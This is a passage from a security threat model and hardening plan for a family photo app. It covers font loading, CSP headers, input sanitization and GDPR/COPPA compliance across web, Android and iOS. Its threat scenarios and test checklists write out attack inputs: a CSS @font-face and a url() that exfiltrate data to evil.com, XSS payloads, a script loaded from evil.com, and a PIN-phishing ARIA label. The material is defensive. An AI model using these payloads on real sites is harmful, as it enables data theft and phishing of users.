3. Code signing verification (iOS does this automatically for non-jailbroken devices)

---

### 9.2 Android Font Provider Certificate Pinning

**Risk Level**: **MEDIUM**

**Threat**: Man-in-the-Middle on Google Fonts Provider

**Description**:
Android plan uses Google Fonts Provider with certificate array:

```kotlin
private val provider = GoogleFont.Provider(
    providerAuthority = "com.google.android.gms.fonts",
    providerPackage = "com.google.android.gms",
    certificates = R.array.com_google_android_gms_fonts_certs
)
```

**Vulnerability**: If `com_google_android_gms_fonts_certs` array is outdated or incorrect, MITM possible.

**Attack Scenario**:
1. Attacker intercepts connection to Google Fonts Provider
2. Presents invalid certificate
3. If certificate array doesn't match, connection should fail - but if array is wrong, connection succeeds
4. Malicious font downloaded

**Current Plans**: No verification shown that certificate array is current.

**Impact**: **MEDIUM**
- Malicious font injection
- UI spoofing

**Likelihood**: **LOW** (requires outdated certificate array + MITM)

**CVSS Score**: 5.9 (Medium) - `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N`

**Mitigation**:
1. Verify `font_certs.xml` matches current Google Fonts Provider certificates:
   ```bash
   # Check latest certificates from Google
   adb shell content query --uri content://com.google.android.gms.fonts
   ```
2. Update certificate array when Google updates signing keys
3. Implement fallback to local fonts if certificate validation fails
4. **Better**: Use local .ttf fonts instead of provider (eliminates network dependency)

---

### 9.3 Web CSP for Font Loading

**Risk Level**: **MEDIUM**

**Threat**: Font Loading from Unauthorized Domains

**Description**:
Without proper CSP, fonts could be loaded from attacker-controlled domains.

**Attack Scenario**:
1. XSS vulnerability in website
2. Attacker injects malicious CSS:
   ```html
   <style>
     @font-face {
       font-family: 'Atkinson Hyperlegible';
       src: url('https://evil.com/malicious-font.woff2');
     }
   </style>
   ```
3. Browser loads font from `evil.com` (exfiltrates user data via font request)

**Current Plans**: No CSP `font-src` directive shown.

**Impact**: **MEDIUM**
- Data exfiltration (font request sends Referer header)
- Malicious font loading

**Likelihood**: **MEDIUM** (if XSS exists)

**CVSS Score**: 5.4 (Medium) - `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N`

**Mitigation**:
1. Add CSP header with strict `font-src`:
   ```http
   Content-Security-Policy: font-src 'self' https://fonts.gstatic.com;
   ```
2. **Better**: Self-host fonts, then:
   ```http
   Content-Security-Policy: font-src 'self';
   ```
3. Monitor CSP violations for unauthorized font loading attempts

---

## 10. Mitigation Strategies

### 10.1 Self-Host Fonts (RECOMMENDED)

**Priority**: **CRITICAL**

**Benefits**:
- ✅ Eliminates Google Fonts tracking (GDPR/COPPA compliant)
- ✅ Removes MITM attack vector
- ✅ Faster performance (no external requests)
- ✅ Works offline
- ✅ No CDN dependency

**Implementation**:

#### Website (Astro)

**Step 1**: Download Atkinson Hyperlegible fonts
```bash
mkdir -p website/public/fonts
cd website/public/fonts

# Download from Google Fonts (official source)
curl -o AtkinsonHyperlegible-Regular.woff2 \
  https://fonts.gstatic.com/s/atkinsonhyperlegible/v11/9Bt23C1KxNDXMspQ1lPyU89-1h6ONRlW45GE5ZgpewSSbQ.woff2

curl -o AtkinsonHyperlegible-Bold.woff2 \
  https://fonts.gstatic.com/s/atkinsonhyperlegible/v11/9Bt73C1KxNDXMspQ1lPyU89-1h6ONRlW45G055qv8Inln2u1WQ.woff2
```

**Step 2**: Update `global.css` (replace Google Fonts link)
```css
/* REMOVE from BaseLayout.astro:
<link href="https://fonts.googleapis.com/..." rel="stylesheet">
*/

/* ADD to global.css */
@font-face {
  font-family: 'Atkinson Hyperlegible';
  font-style: normal;
  font-weight: 400;
  font-display: swap;
  src: url('/fonts/AtkinsonHyperlegible-Regular.woff2') format('woff2');
}

@font-face {
  font-family: 'Atkinson Hyperlegible';
  font-style: normal;
  font-weight: 700;
  font-display: swap;
  src: url('/fonts/AtkinsonHyperlegible-Bold.woff2') format('woff2');
}
```

**Step 3**: Update CSP header
```http
Content-Security-Policy: font-src 'self';
```

**Verification**:
```bash
# Check font loads correctly
npm run dev
# Open http://localhost:4321
# DevTools Network tab - verify fonts load from /fonts/, not Google
```

#### Android

**Step 1**: Download .ttf files to `res/font/` directory
```bash
mkdir -p android/app/src/main/res/font
cd android/app/src/main/res/font

# Download from GitHub (official Braille Institute repo)
curl -L -o atkinson_hyperlegible_regular.ttf \
  https://github.com/googlefonts/atkinson-hyperlegible/raw/main/fonts/ttf/AtkinsonHyperlegible-Regular.ttf

curl -L -o atkinson_hyperlegible_bold.ttf \
  https://github.com/googlefonts/atkinson-hyperlegible/raw/main/fonts/ttf/AtkinsonHyperlegible-Bold.ttf
```

**Step 2**: Update `Type.kt` (remove Google Fonts Provider)
```kotlin
// REMOVE:
// private val provider = GoogleFont.Provider(...)

// REPLACE with local fonts:
private val atkinsonFontFamily = FontFamily(
    Font(R.font.atkinson_hyperlegible_regular, FontWeight.Normal),
    Font(R.font.atkinson_hyperlegible_bold, FontWeight.Bold)
)

val Typography = Typography(
    displayLarge = TextStyle(
        fontFamily = atkinsonFontFamily,
        fontWeight = FontWeight.Bold,
        fontSize = 48.sp,
        lineHeight = 52.8.sp
    ),
    // ... rest of typography
)
```

**Verification**:
```bash
./gradlew assembleQualDebug
# Install on device
adb install app/build/outputs/apk/qual/debug/app-qual-debug.apk
# Verify font renders correctly (no network requests to Google)
```

#### iOS (Already Planned)

iOS plan already uses local .ttf files - **GOOD**. Add hash verification:

```swift
// FontManager.swift
func verifyFontIntegrity(fontName: String, expectedHash: String) -> Bool {
    guard let fontURL = Bundle.main.url(forResource: fontName, withExtension: "ttf"),
          let fontData = try? Data(contentsOf: fontURL) else {
        return false
    }

    let hash = fontData.sha256Hash // Implement SHA256
    return hash == expectedHash
}

// In registerFonts():
let expectedHashes = [
    "AtkinsonHyperlegible-Regular": "abc123...", // Precomputed
    "AtkinsonHyperlegible-Bold": "def456..."
]

for (fontName, expectedHash) in expectedHashes {
    guard verifyFontIntegrity(fontName: fontName, expectedHash: expectedHash) else {
        print("⚠️ Font integrity check failed: \(fontName)")
        // Use system font fallback
        continue
    }
    // Proceed with registration
}
```

**Benefits of Self-Hosting**:
- **Privacy**: No data sent to Google
- **Security**: No MITM risk, fonts verified by hash
- **Performance**: Fonts load from local storage (faster)
- **Compliance**: GDPR/COPPA compliant
- **Reliability**: No CDN downtime

---

### 10.2 Implement Subresource Integrity (If External Fonts Used)

**Priority**: **HIGH** (if not self-hosting)

**Purpose**: Verify external resources haven't been tampered with.

**Implementation**:

#### Website

**Step 1**: Generate SRI hash for Google Fonts CSS
```bash
curl -s "https://fonts.googleapis.com/css2?family=Atkinson+Hyperlegible:ital,wght@0,400;0,700;1,400;1,700&display=swap" | \
  openssl dgst -sha384 -binary | \
  openssl base64 -A
```

**Output**: `sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC`

**Step 2**: Update `BaseLayout.astro`
```html
<link href="https://fonts.googleapis.com/css2?family=Atkinson+Hyperlegible:ital,wght@0,400;0,700;1,400;1,700&display=swap"
      rel="stylesheet"
      integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
      crossorigin="anonymous">
```

**Step 3**: Update SRI hash when Google Fonts updates
```bash
# Add to CI/CD pipeline
npm run verify-sri
```

**Limitations**:
- SRI only verifies CSS file, not the .woff2 fonts it references
- Google Fonts CSS changes frequently (breaks SRI)
- **Better solution**: Self-host fonts

---

### 10.3 Content Security Policy (CSP) Headers

**Priority**: **CRITICAL** (Website)

**Purpose**: Prevent XSS, clickjacking, and unauthorized resource loading.

**Implementation**:

#### Astro Configuration

**File**: `astro.config.mjs`

```javascript
export default defineConfig({
  integrations: [],

  // Add security headers
  vite: {
    plugins: [
      {
        name: 'security-headers',
        configureServer(server) {
          server.middlewares.use((req, res, next) => {
            // Content Security Policy
            res.setHeader('Content-Security-Policy', [
              "default-src 'self'",
              "font-src 'self'", // Self-hosted fonts only
              "style-src 'self' 'unsafe-inline'", // Tailwind requires unsafe-inline
              "script-src 'self'",
              "img-src 'self' data: https:",
              "connect-src 'self'",
              "frame-ancestors 'none'", // Prevent clickjacking
              "base-uri 'self'",
              "form-action 'self'",
              "upgrade-insecure-requests" // Force HTTPS
            ].join('; '));

            // Other security headers
            res.setHeader('X-Content-Type-Options', 'nosniff');
            res.setHeader('X-Frame-Options', 'DENY');
            res.setHeader('X-XSS-Protection', '1; mode=block');
            res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
            res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');

            next();
          });
        }
      }
    ]
  }
});
```

**For Production** (Netlify/Vercel):

**File**: `public/_headers`
```
/*
  Content-Security-Policy: default-src 'self'; font-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self'; img-src 'self' data: https:; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests
  X-Content-Type-Options: nosniff
  X-Frame-Options: DENY
  X-XSS-Protection: 1; mode=block
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: camera=(), microphone=(), geolocation=()
```

**Testing**:
```bash
# Test CSP in report-only mode first
Content-Security-Policy-Report-Only: [policy]; report-uri /csp-reports

# Monitor violations, then switch to enforcing mode
Content-Security-Policy: [policy]
```

---

### 10.4 Input Validation & Sanitization

**Priority**: **HIGH**

**Purpose**: Prevent CSS injection, XSS, and malicious input.

**Implementation**:

#### Website (Astro Components)

**Install DOMPurify**:
```bash
npm install dompurify
npm install -D @types/dompurify
```

**Create Sanitizer Utility**:

**File**: `src/utils/sanitize.ts`
```typescript
import DOMPurify from 'isomorphic-dompurify';

export function sanitizeHTML(dirty: string): string {
  return DOMPurify.sanitize(dirty, {
    ALLOWED_TAGS: [], // No HTML tags allowed
    ALLOWED_ATTR: []
  });
}

export function sanitizeColor(color: string): string {
  // Validate hex color format
  const hexPattern = /^#[0-9A-Fa-f]{6}$/;
  if (!hexPattern.test(color)) {
    return '#7FB3D5'; // Default to Soft Blue
  }
  return color;
}

export function sanitizeARIA(label: string): string {
  // Strip HTML tags from ARIA labels
  return sanitizeHTML(label).trim();
}
```

**Update Components**:

**Button.astro** (before):
```astro
<button aria-label={ariaLabel}>
```

**Button.astro** (after):
```astro
---
import { sanitizeARIA } from '@/utils/sanitize';
const safeAriaLabel = ariaLabel ? sanitizeARIA(ariaLabel) : undefined;
---
<button aria-label={safeAriaLabel}>
```

**FormInput.astro** (before):
```astro
<span id={errorId} role="alert">{error}</span>
```

**FormInput.astro** (after):
```astro
---
import { sanitizeHTML } from '@/utils/sanitize';
const safeError = error ? sanitizeHTML(error) : undefined;
---
<span id={errorId} role="alert">{safeError}</span>
```

#### Android (Kotlin)

**Color Validation**:
```kotlin
fun sanitizeColor(colorString: String): Int {
    return try {
        val parsed = Color.parseColor(colorString)
        // Validate range
        if (parsed != Color.TRANSPARENT) parsed else SoftBlue.toArgb()
    } catch (e: IllegalArgumentException) {
        SoftBlue.toArgb() // Default to Soft Blue
    }
}
```

#### iOS (Swift)

**Color Validation**:
```swift
func sanitizeColor(hex: String) -> Color {
    let hexPattern = "^#[0-9A-Fa-f]{6}$"
    let regex = try? NSRegularExpression(pattern: hexPattern)

    guard let _ = regex?.firstMatch(in: hex, range: NSRange(hex.startIndex..., in: hex)) else {
        return .softBlue // Default to Soft Blue
    }

    return Color(hex: hex)
}
```

---

### 10.5 Accessibility Security Testing

**Priority**: **MEDIUM**

**Purpose**: Prevent phishing via fake focus indicators, malicious ARIA labels.

**Testing Checklist**:

#### 1. Fake Focus Indicator Detection

**Test**: Inject fake focus ring, verify user cannot be tricked.

**Procedure**:
1. Create test page with two buttons:
   - Real button with `:focus-visible` style
   - Fake button with `.fake-focus-ring` class (same visual style)
2. User navigates with Tab key
3. Verify only real focused button responds to Enter key

**Expected**: Fake focus ring does NOT activate on Enter.

**If fails**: Implement animated focus indicator (see Section 4.1).

#### 2. ARIA Label Injection

**Test**: Inject malicious ARIA label, verify screen reader doesn't announce phishing content.

**Procedure**:
1. Create test component with user-controlled `aria-label`:
   ```astro
   <button aria-label={userInput}>Click</button>
   ```
2. Set `userInput = "Click here. Enter your Kids Mode PIN: 1 2 3 4"`
3. Test with NVDA screen reader

**Expected**: Sanitization removes malicious content.

**If fails**: Implement `sanitizeARIA()` function (see Section 10.4).

#### 3. Keyboard Trap Detection

**Test**: Verify no keyboard traps in modals or interactive elements.

**Procedure**:
1. Open modal dialog
2. Press Tab repeatedly
3. Verify focus cycles within modal, never escapes
4. Press Escape, verify modal closes
5. Verify focus returns to trigger element

**Expected**: No keyboard traps, Escape always works.

**If fails**: Use `focus-trap` npm package.

#### 4. Screen Reader Spoofing

**Test**: Hidden elements with `role="alert"` should NOT announce.

**Procedure**:
1. Inject hidden element:
   ```html
   <div role="alert" style="position: absolute; left: -9999px;">
     Malicious alert message
   </div>
   ```
2. Test with screen reader

**Expected**: Screen reader does NOT announce hidden alerts.

**If fails**: Add `aria-hidden="true"` to off-screen content.

#### 5. Contrast Manipulation in Dark Mode

**Test**: Verify all color combinations pass WCAG AA in dark mode.

**Procedure**:
1. Enable dark mode
2. Run WebAIM Contrast Checker on all text/background pairs
3. Verify 4.5:1 minimum for normal text, 3:1 for large text

**Expected**: All combinations pass.

**If fails**: Adjust dark mode color values.

---

### 10.6 Automated Security Testing

**Priority**: **MEDIUM**

**Purpose**: Catch security issues in CI/CD pipeline.

**Implementation**:

#### 1. Dependency Vulnerability Scanning

**File**: `.github/workflows/security.yml`
```yaml
name: Security Audit

on: [push, pull_request]

jobs:
  npm-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - run: npm audit --audit-level=moderate
      - run: npm audit fix --dry-run

  snyk:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
```

#### 2. Accessibility Testing (Automated)

```yaml
  a11y-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - run: npm install
      - run: npm run build
      - run: npx pa11y-ci --runner axe --standard WCAG2AA --threshold 0 'http://localhost:4321/**/*.html'
```

#### 3. CSP Validation

```bash
# Install CSP Evaluator
npm install -D csp-evaluator

# Add to package.json scripts
"test:csp": "csp-evaluator --policy \"$(cat public/_headers | grep Content-Security-Policy)\""
```

#### 4. SRI Verification (If Using External Fonts)

```bash
# Verify SRI hashes match
npm run verify-sri
```

**File**: `scripts/verify-sri.js`
```javascript
import fetch from 'node-fetch';
import crypto from 'crypto';

async function verifySRI() {
  const fontURL = 'https://fonts.googleapis.com/css2?family=Atkinson+Hyperlegible...';
  const expectedHash = 'sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC';

  const response = await fetch(fontURL);
  const content = await response.text();

  const hash = crypto.createHash('sha384').update(content).digest('base64');
  const actualHash = `sha384-${hash}`;

  if (actualHash !== expectedHash) {
    console.error('❌ SRI hash mismatch!');
    console.error(`Expected: ${expectedHash}`);
    console.error(`Actual: ${actualHash}`);
    process.exit(1);
  }

  console.log('✅ SRI hash verified');
}

verifySRI();
```

---

### 10.7 Privacy Compliance (GDPR/COPPA)

**Priority**: **CRITICAL**

**Purpose**: Ensure legal compliance for special needs families.

**Actions Required**:

#### 1. Self-Host Fonts (GDPR/COPPA)

**Status**: See Section 10.1 (already documented)

**Verification**:
```bash
# Verify NO requests to Google domains
npm run build
npm run preview
# DevTools Network tab - filter by "google"
# Expected: 0 requests
```

#### 2. Update Privacy Policy

**File**: `website/src/pages/privacy.astro`

**Add Section**:
```markdown
## Third-Party Services

SmilePile does NOT use third-party services that collect your data:

- ✅ Fonts are self-hosted (no Google Fonts tracking)
- ✅ No analytics or tracking scripts
- ✅ No CDN dependencies that collect IP addresses
- ✅ All data stored locally on your device

**Kids Mode Compliance**: SmilePile complies with COPPA (Children's Online Privacy Protection Act). We do not collect any data from children under 13, including in Kids Mode.
```

#### 3. Kids Mode External Resource Audit

**Checklist**:
- [ ] No Google Fonts in Kids Mode (use self-hosted)
- [ ] No Google Analytics in Kids Mode
- [ ] No external CDNs in Kids Mode
- [ ] No third-party scripts in Kids Mode
- [ ] No network requests in Kids Mode (except photo library access)

**Verification**:
```kotlin
// Android: Disable network in Kids Mode
if (isKidsMode) {
    WebView.setWebContentsDebuggingEnabled(false)
    // Block all network requests
    networkSecurityConfig.setCleartextTrafficPermitted(false)
}
```

```swift
// iOS: Disable network in Kids Mode
if isKidsMode {
    let config = URLSessionConfiguration.default
    config.connectionProxyDictionary = [:]
    // Block all network requests
    URLSession.shared.configuration = config
}
```

#### 4. Cookie Consent (If External Fonts Used)

**NOT RECOMMENDED** - Self-host fonts instead.

**If Required**:
```html
<!-- Cookie consent banner -->
<div id="cookie-consent" hidden>
  <p>We use Google Fonts which may set cookies. <a href="/privacy">Learn more</a></p>
  <button onclick="acceptFonts()">Accept</button>
  <button onclick="rejectFonts()">Use System Fonts</button>
</div>

<script>
  function acceptFonts() {
    // Load Google Fonts
    const link = document.createElement('link');
    link.href = 'https://fonts.googleapis.com/...';
    link.rel = 'stylesheet';
    document.head.appendChild(link);

    localStorage.setItem('fontConsent', 'true');
    document.getElementById('cookie-consent').hidden = true;
  }

  function rejectFonts() {
    // Use system fonts
    document.body.style.fontFamily = '-apple-system, BlinkMacSystemFont, sans-serif';
    localStorage.setItem('fontConsent', 'false');
    document.getElementById('cookie-consent').hidden = true;
  }
</script>
```

---

## 11. Security Testing Checklist

### 11.1 Font Security Testing

**Pre-Implementation**:
- [ ] Download fonts from official source (Braille Institute GitHub or Google Fonts)
- [ ] Verify font file integrity (SHA256 hash)
- [ ] Check font license (SIL OFL allows commercial use)
- [ ] Scan font files for malware (VirusTotal, ClamAV)

**Post-Implementation**:
- [ ] Verify fonts load from self-hosted location (not Google CDN)
- [ ] Test font rendering on all platforms (iOS, Android, Web)
- [ ] Monitor font loading performance (<500ms)
- [ ] Verify fallback fonts render correctly if custom font fails

**Android Specific**:
- [ ] Verify `font_certs.xml` matches Google Fonts Provider certificates (if using provider)
- [ ] Test font loading without network connection (should use cached fonts)

**iOS Specific**:
- [ ] Verify .ttf files included in app bundle
- [ ] Test on jailbroken device (font integrity check should trigger)
- [ ] Verify fonts registered correctly in Info.plist

**Website Specific**:
- [ ] Verify SRI hashes (if using external fonts)
- [ ] Test CSP `font-src` directive blocks unauthorized fonts
- [ ] Verify `font-display: swap` prevents FOIT (Flash of Invisible Text)

---

### 11.2 Color & CSS Injection Testing

**Website**:
- [ ] Verify NO user-controlled color values in CSS custom properties
- [ ] Test dynamic theming (if implemented) with malicious inputs:
  - `?theme=red;}body{display:none`
  - `?theme=<script>alert('XSS')</script>`
  - `?theme=url('https://evil.com/exfiltrate?data=')`
- [ ] Verify color validation function blocks invalid hex codes
- [ ] Test Tailwind config for injection vulnerabilities (static config only)

**Android**:
- [ ] Test color parsing with invalid inputs:
  - `Color.parseColor("invalid")`
  - `Color.parseColor("0xFFFFFFFFFFFFFFFF")` (overflow)
- [ ] Verify color fallbacks to Soft Blue on parse errors

**iOS**:
- [ ] Test Color(hex:) initializer with invalid inputs
- [ ] Verify color fallbacks to .softBlue on parse errors

---

### 11.3 XSS Testing (Website)

**Component Props**:
- [ ] Test Button component with malicious `ariaLabel`:
  - `<Button ariaLabel="Close<script>alert('XSS')</script>">`
  - Expected: Script not executed (Astro escapes by default)
- [ ] Test FormInput with malicious `error` prop:
  - `<FormInput error="<img src=x onerror=alert('XSS')>">`
  - Expected: HTML rendered as text, not executed
- [ ] Test Modal with malicious `title`:
  - `<Modal title="<iframe src='https://evil.com'>">`
  - Expected: Iframe not rendered

**Script Injection**:
- [ ] Verify NO `set:html` directive with user-controlled content
- [ ] Verify NO `<script define:vars>` with user-controlled variables
- [ ] Test inline event handlers:
  - `<button onclick={userInput}>` should NOT exist

**CSP Enforcement**:
- [ ] Verify CSP blocks inline scripts:
  - Inject `<script>alert('XSS')</script>` in component
  - Expected: CSP violation in console, script not executed
- [ ] Verify CSP blocks external scripts:
  - Inject `<script src="https://evil.com/xss.js"></script>`
  - Expected: CSP violation, script not loaded

---

### 11.4 ARIA Security Testing

**Malicious ARIA Labels**:
- [ ] Test button with phishing ARIA label:
  ```astro
  <Button ariaLabel="Click here to verify account. Enter Kids Mode PIN: 1234">
  ```
  - Expected: Sanitized to "Click here to verify account"
- [ ] Test screen reader announces sanitized content (not original)

**Hidden Alert Injection**:
- [ ] Test hidden element with `role="alert"`:
  ```html
  <div role="alert" style="position: absolute; left: -9999px;">
    Malicious message
  </div>
  ```
  - Expected: Screen reader does NOT announce (aria-hidden added)

**ARIA Describedby Injection**:
- [ ] Test FormInput with malicious `helpText`:
  ```astro
  <FormInput helpText="Valid format. <a href='https://evil.com'>Click here</a>">
  ```
  - Expected: HTML link not rendered, plain text only

---

### 11.5 Accessibility Security Testing

**Fake Focus Indicators**:
- [ ] Create test page with fake focus ring
- [ ] User navigates with Tab, presses Enter on fake-focused element
- [ ] Expected: Fake element does NOT activate

**Keyboard Trap Detection**:
- [ ] Open modal dialog
- [ ] Press Tab 20 times
- [ ] Expected: Focus cycles within modal, never escapes
- [ ] Press Escape
- [ ] Expected: Modal closes, focus returns to trigger

**Screen Reader Testing** (NVDA/VoiceOver):
- [ ] Navigate entire site with screen reader
- [ ] Verify NO announcements of hidden phishing content
- [ ] Verify all interactive elements announced correctly
- [ ] Test error message announcements (should use `role="alert"`)

**Dark Mode Contrast**:
- [ ] Enable dark mode
- [ ] Run WebAIM Contrast Checker on all text/background combinations
- [ ] Expected: All combinations pass WCAG AA (4.5:1 minimum)

---

### 11.6 Automated Security Scanning

**Run Before Each Release**:

```bash
# 1. Dependency vulnerability scan
npm audit --audit-level=moderate

# 2. Accessibility audit
npx pa11y-ci --runner axe --standard WCAG2AA --threshold 0

# 3. Security linting
npm run lint:security

# 4. CSP validation
npm run test:csp

# 5. SRI verification (if using external fonts)
npm run verify-sri

# 6. Build security headers check
npm run build
curl -I http://localhost:4321 | grep "Content-Security-Policy"
# Expected: CSP header present
```

**CI/CD Integration** (GitHub Actions):
```yaml
name: Security Audit
on: [push, pull_request]
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
      - run: npm install
      - run: npm audit --audit-level=moderate
      - run: npm run lint:security
      - run: npm run test:csp
      - run: npm run build
      - run: npx pa11y-ci --threshold 0
```

---

### 11.7 Privacy Compliance Testing

**GDPR Compliance**:
- [ ] Verify NO requests to Google domains (fonts.googleapis.com, fonts.gstatic.com)
  ```bash
  npm run build && npm run preview
  # DevTools Network tab - filter "google"
  # Expected: 0 requests
  ```
- [ ] Verify Privacy Policy discloses self-hosted fonts
- [ ] Test from EU IP address (VPN) - no tracking

**COPPA Compliance (Kids Mode)**:
- [ ] Verify Kids Mode makes NO network requests
- [ ] Verify NO Google Analytics in Kids Mode
- [ ] Verify NO third-party scripts in Kids Mode
- [ ] Test with network monitoring tool (Charles Proxy, mitmproxy)
  ```bash
  # Expected: 0 network requests in Kids Mode
  ```

**Font Fingerprinting**:
- [ ] Test with browser fingerprinting tool (AmIUnique, Panopticlick)
- [ ] Verify Atkinson Hyperlegible NOT detectable (if self-hosted)
- [ ] Privacy Policy discloses font usage

---

### 11.8 Platform-Specific Security Testing

**iOS**:
- [ ] Jailbreak detection triggers warning
- [ ] Font integrity check detects tampered .ttf files
- [ ] Keychain stores sensitive data (not UserDefaults)
- [ ] FLAG_SECURE prevents screenshots in Kids Mode (if applicable)

**Android**:
- [ ] SecureActivity prevents screenshots
- [ ] FLAG_SECURE blocks screen recording
- [ ] Encrypted SharedPreferences used for sensitive data
- [ ] Root detection triggers warning

**Website**:
- [ ] CSP headers present in production
- [ ] SRI hashes valid (if using external fonts)
- [ ] HTTPS enforced (`upgrade-insecure-requests`)
- [ ] Security headers validated (SecurityHeaders.com scan)

---

## 12. Risk Assessment Summary

### Critical Risks (MUST FIX)

| Risk | Severity | Likelihood | CVSS | Mitigation |
|------|----------|------------|------|------------|
| Google Fonts CDN Compromise | Critical | Very Low | 9.1 | Self-host fonts (Section 10.1) |
| COPPA Violation (Kids Mode) | Critical | High | N/A | Self-host fonts, audit external resources |
| Missing CSP Headers | High | High | 7.5 | Implement CSP (Section 10.3) |

### High Risks (SHOULD FIX)

| Risk | Severity | Likelihood | CVSS | Mitigation |
|------|----------|------------|------|------------|
| MITM Attack on Font Loading | High | Medium | 7.2 | Self-host fonts OR implement SRI |
| XSS via Component Props | High | Medium | 7.5 | Sanitize all inputs (Section 10.4) |
| GDPR Violation (Google Fonts) | High | High | N/A | Self-host fonts |

### Medium Risks (CONSIDER FIXING)

| Risk | Severity | Likelihood | CVSS | Mitigation |
|------|----------|------------|------|------------|
| Font File Integrity | Medium | Low | 5.3 | Implement SRI OR hash verification |
| CSS Custom Properties Injection | Medium | Low | 5.4 | Validate color inputs |
| ARIA Label Injection | Medium | Low | 5.4 | Sanitize ARIA attributes |
| Dark Mode Contrast Manipulation | Medium | Low | 4.3 | Validate all dark mode combinations |
| Android Font Provider Certificate | Medium | Low | 5.9 | Verify certificate array, OR self-host |

### Low Risks (INFORMATIONAL)

| Risk | Severity | Likelihood | CVSS | Mitigation |
|------|----------|------------|------|------------|
| Font Fingerprinting | Low | High | N/A | Privacy Policy disclosure |
| iOS Font Tampering (Jailbreak) | Low | Very Low | 3.3 | Jailbreak detection, hash verification |
| Keyboard Trap Attacks | Low | Low | 2.6 | Automated testing, manual QA |

---

## 13. Recommended Implementation Order

### Phase 1: Critical Security (BEFORE Implementation)

**Duration**: 2-4 hours

**Actions**:
1. ✅ **Self-host fonts** (iOS, Android, Website)
   - Download Atkinson Hyperlegible from official source
   - Verify file integrity (SHA256 hash)
   - Update font loading code (remove Google Fonts references)
   - Test font rendering on all platforms

2. ✅ **Implement Content Security Policy** (Website only)
   - Add CSP headers to Astro config
   - Test with report-only mode
   - Monitor violations, fix issues
   - Switch to enforcing mode

3. ✅ **Privacy compliance audit**
   - Verify NO Google requests (DevTools Network tab)
   - Update Privacy Policy (disclose self-hosted fonts)
   - Audit Kids Mode for external resources

**Validation**:
- [ ] 0 requests to `fonts.googleapis.com` or `fonts.gstatic.com`
- [ ] CSP header present: `Content-Security-Policy: font-src 'self'; ...`
- [ ] Privacy Policy updated

---

### Phase 2: Input Validation (During Implementation)

**Duration**: 4-6 hours

**Actions**:
1. ✅ **Sanitize component props** (Website)
   - Install DOMPurify
   - Create `sanitize.ts` utility
   - Update Button, FormInput, Modal components
   - Add TypeScript type enforcement

2. ✅ **Color validation** (All platforms)
   - Implement hex color validation
   - Add fallbacks to Soft Blue on error
   - Test with malicious inputs

3. ✅ **ARIA sanitization** (Website)
   - Sanitize all `aria-label`, `aria-describedby` props
   - Strip HTML tags from ARIA attributes
   - Test with screen reader

**Validation**:
- [ ] XSS test inputs blocked (e.g., `<script>alert('XSS')</script>`)
- [ ] Invalid color inputs fallback to Soft Blue
- [ ] ARIA labels sanitized (HTML stripped)

---

### Phase 3: Accessibility Security (During Implementation)

**Duration**: 4-6 hours

**Actions**:
1. ✅ **Focus indicator security**
   - Test fake focus indicators (should NOT activate)
   - Consider animated focus styles (harder to fake)
   - Code review focus-visible implementations

2. ✅ **Keyboard navigation security**
   - Test modal focus traps (Tab cycles, Escape closes)
   - Verify no keyboard traps on any screen
   - Add `inert` attribute to background content when modal open

3. ✅ **Screen reader security**
   - Test with NVDA/VoiceOver
   - Verify hidden elements NOT announced
   - Test malicious ARIA labels (should be sanitized)

**Validation**:
- [ ] Fake focus indicators do NOT activate on Enter
- [ ] Modal focus trap works correctly
- [ ] Screen reader does NOT announce hidden phishing content

---

### Phase 4: Automated Testing (Post-Implementation)

**Duration**: 4-6 hours

**Actions**:
1. ✅ **Set up CI/CD security pipeline**
   - Add `security.yml` GitHub Actions workflow
   - Configure `npm audit`, pa11y-ci, CSP validation
   - Add SRI verification (if using external fonts)

2. ✅ **Accessibility testing automation**
   - Configure Axe DevTools in CI
   - Set WCAG 2.2 AA threshold (0 violations)
   - Add lighthouse CI for accessibility scores

3. ✅ **Dependency monitoring**
   - Configure Dependabot for security updates
   - Set up Snyk or similar (optional)
   - Monitor Atkinson Hyperlegible repo for CVEs

**Validation**:
- [ ] CI/CD pipeline runs on every PR
- [ ] 0 critical vulnerabilities in npm audit
- [ ] 0 accessibility violations in pa11y-ci
- [ ] Lighthouse accessibility score 95+

---

### Phase 5: Manual Security Testing (Before Release)

**Duration**: 6-8 hours

**Actions**:
1. ✅ **Penetration testing**
   - XSS injection attempts (component props)
   - CSS injection attempts (color inputs)
   - ARIA injection attempts (screen reader phishing)
   - Font loading MITM simulation

2. ✅ **Privacy compliance verification**
   - Monitor network requests (DevTools, Charles Proxy)
   - Verify 0 Google requests
   - Test from EU IP (GDPR compliance)
   - Test Kids Mode isolation (0 network requests)

3. ✅ **Cross-platform security testing**
   - iOS: Jailbreak detection, font integrity check
   - Android: Root detection, screenshot prevention
   - Website: CSP enforcement, security headers

**Validation**:
- [ ] All penetration tests pass (no vulnerabilities)
- [ ] Privacy compliance verified (0 tracking)
- [ ] Platform-specific security features working

---

## 14. Conclusion

### Overall Security Posture

**Current State (Before Mitigation)**: **MEDIUM RISK**
- External font loading introduces MITM attack vector
- Privacy concerns (GDPR/COPPA) with Google Fonts
- Missing CSP headers on website
- Limited input validation in components

**After Mitigation**: **LOW RISK**
- Self-hosted fonts eliminate third-party dependency
- CSP headers prevent XSS and clickjacking
- Input sanitization blocks injection attacks
